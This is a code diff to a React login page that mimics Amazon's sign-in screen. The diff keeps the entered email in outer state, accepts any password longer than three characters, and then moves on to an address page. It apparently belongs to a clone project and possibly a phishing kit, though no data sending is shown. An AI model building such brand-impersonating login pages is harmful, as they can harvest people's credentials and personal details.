@@ -5,8 +5,9 @@ import Loading from "../assets/loading.gif";
 
 import LoginError from "../components/LoginError";
 import Header from "../components/Header";
+import Footer from "../components/Footer";
 
-const Login = () => {
+const Login = ({ setOuterEmail }) => {
   // title
   document.title = "Amazon Sign-In";
 
@@ -19,6 +20,7 @@ const Login = () => {
 
   const handleContinue = () => {
     if (email.length > 0) {
+      setOuterEmail(email);
       setShowPassword(true);
     }
   };
@@ -27,7 +29,7 @@ const Login = () => {
     if (password.length > 3) {
       setTimeout(() => {
         setLoading(true);
-      }, 5000)
+      }, 5000);
       setLoading(false);
       navigate("/address");
     }
@@ -39,7 +41,7 @@ const Login = () => {
     <>
       <Header />
 
-      {showError && <LoginError />}
+      {showError && <LoginError message="Invalid email or password."/>}
 
       <div className="w-[23%] mx-auto mt-2 border rounded-[4px] border-[#dad4d4] font-amazonMain px-6 py-4">
         <p className="text-black text-[28px] w-fit my-5">Sign in</p>
@@ -165,36 +167,7 @@ const Login = () => {
         </>
       )}
 
-      <div className="mt-[30px] w-[20%] mx-auto">
-        <div className="flex justify-evenly items-center w-full text-[11px] !leading-[1.465]">
-          <a
-            href="https://www.amazon.com/gp/help/customer/display.html/ref=ap_desktop_footer_cou?ie=UTF8&nodeId=508088"
-            className="text-blue-800"
-          >
-            Conditions of Use
-          </a>
-
-          <a
-            href="https://www.amazon.com/gp/help/customer/display.html/ref=ap_desktop_footer_privacy_notice?ie=UTF8&nodeId=468496"
-            className="text-blue-800"
-          >
-            Privacy Notice
-          </a>
-
-          <a
-            href="https://www.amazon.com/gp/help/customer/display.html"
-            className="text-blue-800"
-          >
-            Help
-          </a>
-        </div>
-
-        <div className="mt-2 w-full text-center">
-          <span className="text-[#555] text-[11px] leading-[1.465] text-center">
-            © 1996-2023, Amazon.com, Inc. or its affiliates
-          </span>
-        </div>
-      </div>
+      <Footer />
     </>
   );
 };
